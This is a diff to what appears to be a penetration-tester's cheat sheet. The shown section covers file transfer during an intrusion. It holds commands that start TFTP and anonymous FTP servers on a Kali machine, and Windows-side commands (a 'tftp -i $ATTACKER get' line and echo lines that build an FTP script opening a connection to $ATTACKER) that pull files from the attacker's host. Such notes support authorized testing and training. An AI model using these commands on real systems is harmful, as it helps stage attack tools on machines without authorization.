@@ -131,18 +131,18 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 
 ###### TFTP
 ```bash
-#tftp; cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
+#tftp; Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
 service atftpd start
 
 # Windows
-tftp -i $ATTACKER get /download/location /save/location
+tftp -i $ATTACKER get /download/location/file /save/location/file
 ```
 ###### FTP
 ```bash
-# Kali. Set up ftp server with anonymous logon;
+# Linux: set up ftp server with anonymous logon access;
 twistd -n ftp -p 21 -r /file/to/serve
 
-# Windows Shell. Read FTP commands from ftp-commands.txt non-interactively;
+# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
 echo open $ATTACKER>ftp-commands.txt
 echo anonymous>>ftp-commands.txt
 echo whatever>>ftp-commands.txt
